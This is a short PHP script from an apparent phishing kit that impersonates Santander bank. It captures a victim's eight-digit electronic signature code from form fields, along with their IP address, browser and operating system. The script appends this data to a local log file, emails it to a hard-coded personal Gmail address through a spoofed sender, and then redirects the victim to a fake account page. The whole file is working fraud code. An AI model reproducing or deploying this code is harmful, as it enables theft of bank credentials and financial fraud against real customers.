<?php

include("../HOSTER.php"); 
include("blocker.php");
include("detect.php");

$msg.="------------------------------\r\n";
$msg=" |+ BANk|Vbv(SANT-ANDER) ///SHkIllUA\r\n";
$msg.="|+ FIRMA ELECTRÓNICA : {$_POST['k1']}{$_POST['k2']}{$_POST['k3']}{$_POST['k4']}{$_POST['k5']}{$_POST['k6']}{$_POST['k7']}{$_POST['k8']} \r\n";
$msg.="------------------------------\r\n";
$msg.="|+ localIP : {$_SERVER['REMOTE_ADDR']}\r\n";
$msg.="|+ BROWSER : {$_SESSION['browser']} On/ {$_SESSION['os']}\r\n";
$msg.="\r\n";
$msg.="\r\n";
$save=fopen("../groupe.txt","a+");fwrite($save,$msg);fclose($save);
$email="cocco.clement15@gmail.com"; //HERE
$subject="FIRMA(SANTANDERBANk) =?utf-8?Q?=F0=9F=94=A5?= ({$_SERVER['REMOTE_ADDR']})";
$headers="From: EIkCHI™<SANTANDERBANk@moneySquad.org>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($email,$subject,$msg,$headers);

header("Location: ../../Mi_cuenta.php"); /* Redirect browser */

?>